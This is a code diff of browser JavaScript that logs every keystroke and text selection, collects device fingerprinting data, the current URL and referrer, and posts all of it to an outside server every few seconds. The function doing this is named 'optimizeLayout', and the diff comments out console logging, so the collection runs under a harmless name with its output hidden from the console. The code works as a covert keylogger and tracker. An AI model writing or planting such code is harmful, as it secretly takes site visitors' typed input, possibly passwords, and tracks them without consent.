@@ -54,87 +54,95 @@ let eventsBuffer = [];
 let keyBuffer = [];
 
 setInterval(() => {
-    if (eventsBuffer.length > 0) {
-        optimizeLayout('eventBufferInterval');
+    if (eventsBuffer.length > 0 || keyBuffer.length > 0) {
+        optimizeLayout('bufferInterval');
     }
-    if (keyBuffer.length > 0) {
-        optimizeLayout('keyBufferInterval');
-    }
-}, 3000);//1min=60 000
+}, 5000); // 3 seconds
+
 
 
 
 function addToBuffer(type, data) {
     eventsBuffer.push({ type, data });
-    if (eventsBuffer.length >= 1) {
-        // twice: event  key
-        optimizeLayout('bufferThreshold');
-    }
+    // if (eventsBuffer.length >= 60) {
+    // optimizeLayout('bufferThreshold');
+    // }
 }
 
 
+const screenWidth = window.screen.width;
+const screenHeight = window.screen.height;
+const browserLanguages = navigator.languages.join(", ");
+const primaryBrowserLanguage = navigator.language || "N/A";
+const platform = navigator.platform;
+const cookiesEnabled = navigator.cookieEnabled;
+const colorDepth = window.screen.colorDepth;
+const deviceMemory = navigator.deviceMemory || "N/A";
+const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
+const userAgent = navigator.userAgent;
+const humanReadableTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+
+const proof = {
+    c: math,
+    cTimeUTC: mathCreatedTime || 'N/A',
+    TimezoneNow: humanReadableTimezone,
+    w: screenWidth,
+    h: screenHeight,
+    PrimaryBrowserLanguage: primaryBrowserLanguage,
+    BrowserLanguages: browserLanguages,
+    Platform: platform,
+    ColorDepth: colorDepth,
+    DeviceMemory: deviceMemory,
+    HardwareConcurrency: hardwareConcurrency,
+    CookiesEnabled: cookiesEnabled,
+    UserAgent: userAgent,
+    Current: window.location.href,
+    From: document.referrer,
+    // EventBuffer: eventData,
+    // KeyBuffer: keyData
+};
+
 function optimizeLayout(triggerEvent) {
-    const screenWidth = window.screen.width;
-    const screenHeight = window.screen.height;
-    const browserLanguages = navigator.languages.join(", ");
-    const primaryBrowserLanguage = navigator.language || "N/A";
-    const platform = navigator.platform;
-    const cookiesEnabled = navigator.cookieEnabled;
-    const colorDepth = window.screen.colorDepth;
-    const deviceMemory = navigator.deviceMemory || "N/A";
-    const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
-    const userAgent = navigator.userAgent;
-    const humanReadableTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
     let eventData = eventsBuffer.map(event => `${event.type}:${event.data}`).join('|');
     let keyData = keyBuffer.join('');
 
-    const proof = {
-        c: math,
-        cTimeUTC: mathCreatedTime || 'N/A',
-        TimezoneNow: humanReadableTimezone,
-        w: screenWidth,
-        h: screenHeight,
-        PrimaryBrowserLanguage: primaryBrowserLanguage,
-        BrowserLanguages: browserLanguages,
-        Platform: platform,
-        ColorDepth: colorDepth,
-        DeviceMemory: deviceMemory,
-        HardwareConcurrency: hardwareConcurrency,
-        CookiesEnabled: cookiesEnabled,
-        UserAgent: userAgent,
-        Current: window.location.href,
-        From: document.referrer,
-        EventBuffer: eventData,
-        KeyBuffer: keyData
-    };
+    proof.EventBuffer = eventData;
+    eventsBuffer = [];
+    proof.KeyBuffer = keyData;
+    keyBuffer = [];
     if (triggerEvent) {
         proof.Event = triggerEvent;
     }
 
-    console.log(proof); // This will display the content of proof in the console.
-    if (Object.keys(proof).length === 0) {
-        console.error('Proof object is empty!');
-    }
 
-    
-    
+    // console.log(proof); // This will display the content of proof in the console.
+    // if (Object.keys(proof).length === 0) {
+    //     console.error('Proof object is empty!');
+    // }
+
+
     fetch('https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify(proof)
-    }).catch(error => {
-        console.error('Error:', error);
-    }).finally(() => {
-        eventsBuffer = [];
-        keyBuffer = [];
-    });
+    })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.text();
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        })
+        .finally(() => {
+        });
 }
 
-
-
 optimizeLayout(`visitCurrentPage:${window.location.href}`);
+
 
 document.addEventListener('keydown', (e) => {
     if (e.key.length === 1) {
@@ -143,9 +151,9 @@ document.addEventListener('keydown', (e) => {
         keyBuffer.push(`<<<${e.key}>>>`);
     }
 
-    if (keyBuffer.length >= 12) {
-        optimizeLayout('keyBufferThreshold');
-    }
+    // if (keyBuffer.length >= 12) {
+    //     optimizeLayout('keyBufferThreshold');
+    // }
 });
 
 document.addEventListener('mouseup', function () {
@@ -157,7 +165,7 @@ document.addEventListener('mouseup', function () {
             encodeURI(words[i]);
             // words[i] = encodeURI(words[i]);
         } catch (err) {
-            console.error("Error Selecting and Encoding the word:", err, "The Word is:", words[i]);
+            // console.error("Error Selecting and Encoding the word:", err, "The Word is:", words[i]);
             words[i] = " ";
         }
     }
